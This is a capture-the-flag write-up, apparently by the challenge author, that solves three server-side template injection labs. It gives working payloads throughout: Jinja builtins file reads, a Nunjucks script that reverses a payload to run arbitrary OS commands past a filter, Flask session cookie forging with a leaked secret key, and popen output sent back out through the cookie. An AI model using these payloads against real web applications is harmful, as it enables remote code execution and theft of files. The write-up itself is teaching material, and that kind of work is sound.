title: Xmas CTF Day 2 Writeup
date: 2021-01-17 12:00:14
tags: Hacking, CUEH, CTF, SSTI, Comsec, writeup
Summary: >
	Writeup of the SSTI (day 2) based challenges for the Comsec Xmas CTF.
	
	
# Introduction

In this post we will cover the SSTI based challenges for Day 3 of the CTF.

I am going to try to keep the discussion down, and focus on the
challenges themselves, if you want to get up to speed on the
vulnerability itself there is 
[a post giving some background on SSTI]({filename}/xmasctf/Xmas_Day2_SSTI.md)

## Common Machine Details

All of the machines had pretty much the same web page, (I blame the dev for being lazy)
Our Kings have some kind of web form for requesting presents

![Web Page]({attach}/images/xmasctf/Present_List.png)

As its a web based challenge, we will ignore things like Nmap (there
shouldn't be any relevant open ports) and focus our enumeration on the usual web stuff.

# Easy

## Reconnaissance 

Our first stage is recon,  lets see what we can find out about the page itself.

### The HTML
While some people like to use tools like Burp for this, I still like to do my initial stuff by hand, so fire up the view source window.

Its pretty bare, no links to anything interesting on the site, and the only content of interest is this form

```
<form method="post">
  <div class="form-group">
    <label for="nameEntry">Your Name</label>
    <input class="form-control" id="nameEntry" name="name" placeholder="Name">
  </div>
  <div class="form-group">
    <label for="whichKing">King to bring the Gift</label>
    <select class="form-control" id="whichKing" name="king">
      <option value="Balthazar">Balthazar</option>
      <option value="Melichor">Melichor</option>
      <option value="Gaspar">Gaspar</option>
    </select>
  </div>
  <div class="form-group">
    <!-- Whats the Equivalent of a Christmas Easter Egg, A Bolo Rei? -->
    <label for="presentList">Gift Requests</label>
    <textarea class="form-control" id="presentList" rows="3" name="gift"></textarea>
  </div> 
  <button type="submit" class="btn btn-primary">Submit</button>
</form>
```

So this tells us some idea of the data that gets sent when we submit the form.  
There is also something about an Easter egg,  which we can come back to later.

### Gobuster / Robots.txt

Before we start poking the site we also look to see if there are any other pages that we can get to.
First (as we live in hope, not pure CTF land) we take a look at *ROBOTS.txt* which lets us know there is a *debug* page the devs don't want Google finding

```
User-Agent: *
Disallow: /debug
```

Running gobuster with a common word list also identifies this debug page

### The Debug Page

Shows us the source code for the flask application itself.  How nice of the dev's...

We can see from the way that the template is built, its likely to be
vulnerable to SSTI, rather than have any substitution within the
template itself, the dev uses the string ```replace()``` function.
This should let us inject template objects of our own.

```
errorPage = """
{% extends 'base.html' %}
{% block content %}
<h2>Error</h2>
<div class="alert alert-danger" role="alert">
ERROR:  WHO is not a King
</div>
{% endblock content %}
"""
```

This pages gets rendered when there is an error in the King that gets
selected.  If the user somehow manages to submit a King that the app
doesn't know about, the error message gets shown.

### Recon Summary

It looks like we have all of the pieces of our vulnerability puzzle in place.

We make a **POST** request to the index */* to submit our form, 
and gives us an idea of the parameters that are sent.

  - The users name
  - A King (from a select)
  - A Request for gifts.

If the King is not one of the ones the system knows about, it renders
a template with a possible SSTI in it.

## Initial Exploitation

Next we want to test if our expected issue is correct.  To do this we
want to send something like ```{{ 1 + 1 }}``` as a payload.  If the
site is vulnerable to SSTI, it should render out as 2.

However we have a couple of speed bumps on the way to do this.

  - The King is limited to the values in the forms ```<select>``` that
    limits our possible payloads.
  - Form submission is a POST request, so its not trivial to change
    the form by mangling the query string.

There are a couple of solutions to this:

### Using NSA level hacking tools

For the first we are going to fire up the *NSA level hacking tool*
that is the inspect element window that comes in all modern web
browsers.  Its a really useful tool for monkeying around with the
source code of a page on the fly, so should let us change the value
sent.  We simply change one of the Kings in the select to be our
payload ```value = {{ 1+1 }}```

![Pro Level Hacking]({attach}/images/xmasctf/MangleForm.png)

Which then renders the error page with our Injected payload of 3

![Success!]({attach}/images/xmasctf/SSTI_Success.png)

### Using Python

While buggering about with the inspector, or burp works, we could also
use Python.  The requests library lets us send and receive data from
websites, and is my preferred approach, because it saves me wearing my
mouse out.

We write a simple script

```
import requests
URL = "http://127.0.0.1:5000"
data = {"king": "{{ 4+4 }}"}
r = requests.post(URL, data)
print (r.text)
```

And we get Code Execution in the Response.

```
<h2>Error</h2>
<div class="alert alert-danger" role="alert">
ERROR:  8 is not a King
</div>
```

## Getting the Flag

Now we know the site is vulnerable to SSTI, its time to get a flag.

We could try to go down the shell route, or we can just try to read the flag file from the system.
(I didn't try the shell, to be honest I find the whole python reverse shell thing a torturous process).

So our first question is how do we get RCE within Flask /
Jinja. (Note: I have a longer post planned for this, so we will just
cover the basics here)

It turns out our issue stems from some of the global variables that
are available in all templates. As (almost) everything in Python is an
Object, it turns our we can make use of these to find the
functionality we need.

For example, we can access any global variables available to the the application object with the following payload

```
{{ request['application']['__globals__'] }}"
```

Now as the application is a Python object these globals also include
things like any classes it knows about and this includes not only
Flask related stuff, but [Python's builtin functions](https://docs.python.org/3/library/functions.html).

Now there is a load of useful stuff here, and we can start chaining together statements to get the 
result we want.

For example, one of the builtin function is ```open()``` which will allow us to read the contents of a file.
Lets make use of that to try and get the flag.

```
{{ request['application']['__globals__']['__builtins__'].open('flag.txt').read() }}
```

Which gives us the output (and the flag)

```
<div class="alert alert-danger" role="alert">\nERROR:  CUEH{S1mpl3_SSTI_With0ut_Filters}\n is not a King\n</div>
```

Now obviously, this relies the flag being in a place we can guess
*flag.txt* and readable by the user running the flask application.
For instance we can use the same approach to read the */etc/passwd*
file, but not */etc/shadow*

In the hard example we will see how we can solve some of these problems.

## Easter Egg

In our recon we also identified something that could be an Easter egg.

There is also the "BoloRei" function.  (Its a xmas bread,  like a easter-egg i suppose)

If we ask the kings for a flag we get the following message

```
# Input 
flag

# Output
Polite people might get what they want
```

Lets ask nicely.

```
# Input 
A flag please

# Output
As you asked nicely. CUEH{TEMPFLAG}
```


# Moderate

The moderate example has the same website as the Easy version. However, there are a few differences.


  - The Site itself is written in Node.js,  using Nunjucks as the template engine
  - There is some filtering applied to the user input by the program, with following words blocked
    - ```require```
	- ```child-process```
	- ```exec```


## Finding the SSTI

While we might be dealing with a completely different backend and
template system, there are the same issues here as our easy example.
The developer still uses an insecure "replace" style function to build
the final template, and the template engine supports some level of code execution.

We can test for SSTI using the same input as before, setting the value of *king* to be ```{{ 1+1 }}```
which gives us the injected output 2.

### SSTI in Node / Nunjucks

We are now faced with a similar problem to that with the Flask example
above, we have code execution, but how do we get it to do something
interesting?

Like in python, we can make use existing objects to work our way back to the global name space
for example using 

```javascript
global.process.mainModule
```

Normally, with Node we could try to use things like require but these will be blocked by the filter.

For example, we could try to use the ```fs``` module to read files using a payload something like this to read the flag

```javascript
global.process.mainModule.require('fs').fileReadSync('flag.txt').read('utf-8')
```

Or (for reasons that might become clear later), we could use a more
general function to execute OS commands.

```javascript
global.process.mainModule.require('child_process').execSync('COMMAND_TO_RUN')
```

### Dealing with the filter,

The filter itself had me scratching my head for a while.  Not in how
to defeat it (because I wrote the damn CTF) but how to actually
implement something that was interesting.  It might surprise you to
know that these things don't just come in a dream (if only it was that
simple), but instead its a similar process to breaking into a box.  I
knew I wanted some form of filter, I knew I wanted the kind of things
I wanted to filter, so how can I make this happen?  The answer came
from the documentation.  It turns out that, like Jinja, NunJucks has a
load of built in helper methods. Now it was just time to work out how
to build a filter, that relied on these to fail.

The answer came with the
[Reverse](https://mozilla.github.io/nunjucks/templating.html#reverse)
method.  This will reverse the input given to the filter, whats more
interesting (and I need to investigate further) is it appears that the
reverse function takes place **before** any of the other processing
happens.

So we now have our POC.

  1. Build a payload string that will run user specified commands
  2. Reverse it
  3. Create an SSTI payload that calls the builtin *reverse* function on this payload.
  

A Quick and dirty python script to do this is below

```
def runCommand(theCommand="id"):
    """Run a command
    """
	#Our evil payload
    kingString = "return global.process.mainModule.require('child_process').execSync('{0}')".format(theCommand)

    #Reverse the Thing
    revString = kingString[::-1]

	# Construct template that reverses the output
    payloadString = '{{{{range.constructor("{0}\" | reverse )()}}}}'.format(revString)

print(payloadString)
    payload = {"name": "dang", "king": payloadString , "gift": "foo\nbar"}
    r = requests.post(URL, data=payload)
    print(r.text)
```

Now for the reason for creating something that takes system commands (rather than just reads a file)

Trying the program to read the *flag.txt* file fails.  It turns out
that the flag is not in the same directory the application is running
from, so we need a way to find it.  We could use the ```fs``` class to
traverse the file system, but Linux has a much nicer solution using the
*find* command.

```
runCommand("find / -name flag.txt")

<h2>Error</h2><div class='alert alert-danger' role='alert'>ERROR:  /flag.txt is not a King</div>
```

And read the */flag.txt* file

```
runCommand("cat /flag.txt")

<h2>Error</h2><div class='alert alert-danger' role='alert'>ERROR:  CUEH{N0de_Als0_Ha5_Injection_Pr0bl3ms} is not a King</div>
```

So this example is much the same as the easy one, but this time we are
dealing with a non python framework.  We also had to make use of
template helper functions to get our input in a state to bypass filters.


# Hard

The final hard challenge took us back to Python and Flask.  It shows
us that the key to flasks client side cookies really does need to be
kept secure.  We also have some more filters to  bypass.


## Logging In

The first thing we get greeted with is a login page.  We try some
default creds like admin, admin (because it would be rude not to)

Our recon process shows that the site devs have still given us the */debug* URL that shows us the code.
So we can dig deeper into the Login Process

```
@app.route("/login", methods=["GET","POST"])
def login():
    if "user" in session:
        if session["user"] in ["Balthazar", "Melichor", "Gaspar"]:
            #We have logged in correctly, go back to the index
            return flask.redirect(flask.url_for('/'))
            pass

    if flask.request.method == "POST":
        logging.warning(flask.request.form)
        #Otherwise deal with whatever content gets posted
        email = flask.request.form.get("email")
        message = "<div class='alert alert-info'>{0} Not in database</div>".format(email)
        return flask.render_template("login.html", message=message)
        
    return flask.render_template("login.html")
```

While we get a message about Databases, no check is actually made on
the user input (I am sorry if you tried SQLMapping this). So there is no way we are going to be able to login. So What else is going on?

All of the pages have this session cookie check

```python
if "user" in session:
	if session["user"] in ["Balthazar", "Melichor", "Gaspar"]:
	    ... do whatever ...
```

So what is it about Flask session cookies that we can exploit?

It turns out that session cookies are stored client side,  while its usually a very bad idea to put anything 
related to the auth's client side,  both Flask and JWT make use of a PKI style technique to keep the cookies secure.

This means that (if they can decode the hardcore base64 encoding) a user can read the cookie.
For example, when we are not logged in, out cookie looks like this:

 - Encoded: ```eyJ1c2VyIjoidW5rbm93biJ9.YARJwA.I2jJ5E_nvua27Pu8RJtzZXX9oOQ```
 - Decoded: ```{"user":"unknown"}`.IÀ.6..D.û.Û³îñ.mÍ.×ö..```


With the first part of the decoded output our cookie value, and the second the checksum.

Reading a bit more about the cookie process, we see the warning in
**BIG RED TEXT** that we need to keep the session generation key secure.
Unfortunately at the top of the file we see this (at least it isn't CHANGEME)....

```python
app.config['SECRET_KEY'] = "FooBar"
```

So we have all the pieces of the puzzle that lets us login to the system.

  1. Get cookie for non validated user
  2. Change cookie value for "user" to "Balthazar"
  3. Re-sign updated cookie with the known key
  
I grabbed some [codez of the
internet](https://ctftime.org/writeup/11812) for the resigning for the
cookie, and was able to login with my new creds.


## Getting the Flag.

So we have a couple of ways to do this.

Both approaches involves using the cookie to add a payload and exfiltrate the
data. 

One of the students also used the cookie to bypass the string
restriction, Its a really nice approach, but I won't go into details
here, [Bens Blog](https://blog.benroxbeecox.me/CovChristmasCTF/Day2/)
has a nice writeup (from a students POV) that I recommend reading

However, that's not the way I intended, using the cookie itself to . I
should have thought of this as I used a similar technique to
exfiltrating the data in my notes.


Anyway, on the the exploit itself. The filter removes the following:

```
badChars = ["{{","}}","'",'"',"format","socket"]
```

As well as keywords that might be useful for getting a remote shell, we also have some things
that are needed for the types of template injection we have been using so far to work.

Even our testing payload of ```{{ 1+1 }}``` gets filtered, due to the
double brackets.  We are also going to have problems using things like
*join* to build the payload out of a list, as the quotes needed string
characters are also filtered.

### Bypassing the {{ filter

First lets work out how to bypass the filter on the brackets.

The template languages also support logical statements, so we can take a similar approach 
used in Blind SQL injection to stat to leak information

Logical functions in flask look something like this

```
{% if <whatever> %}
	Do Something
{% else %}
	Do something else
{% endif %}
```

Now given that a logical function needs to evaluate something, we can
ensure code is executed using something along the lines of.

```python
{% if Payload == true %}
{% endif%}
```

So what do we have as a payload, lets use a nice generic system
command, as before we need to build this up from the globals.

```python
request.application.__globals__.__builtins__.__import__('os').popen('EVIL').read()
```

### Bypassing the String Filter

While this is good in theory, the filter also causes an issue with the string parts of our payload.
We need a way of replacing the ```os``` and ```EVIL``` parts of out payload.

As we are not limited in the elements of the request we send, I made
use query string parameters here.  However, we could add more elements
to our POST data, or encode the params in the cookies.

The template also has global access to the request parameters so it
makes it easy to fetch the params back out again.

This means our payload to run a generic command becomes

```python
request.application.__globals__.__builtins__.__import__(request.args.a).popen(request.args.b).read()
```

We can control both the python module loaded (os) and the command
we run using the 'a' and 'b' arguments in the query string.

### Exfiltrating the data

The final piece of the puzzle is how to exfiltrate the data, as the
cookie object is globally available, we are just going to make use of
that, and set a value in the cookie to the output of our system command.

```python
{% if session.update(foo=request.application.__globals__.__builtins__.__import__(request.args.a).popen(request.args.b).read() %} Bleh {% endif %}
```

We can then hunt for our flag using the command ```ls -l```
then get the data with ```cat th1sIsth3Flag.txt```


# Summary

Here we had 3 SSTI based challenges

 - The first gave a pretty gentle introduction to SSTI in Flask / Jinja
 - In the second we had to do SSTI in Node.  We also had to work around some basic filtering
 - The Hard challenge brought together a few concepts.
    - Flasks Client Side cookies (like JWT) are only as secure are the token
	- We also looked at exfiltrating the data using the session cookie.
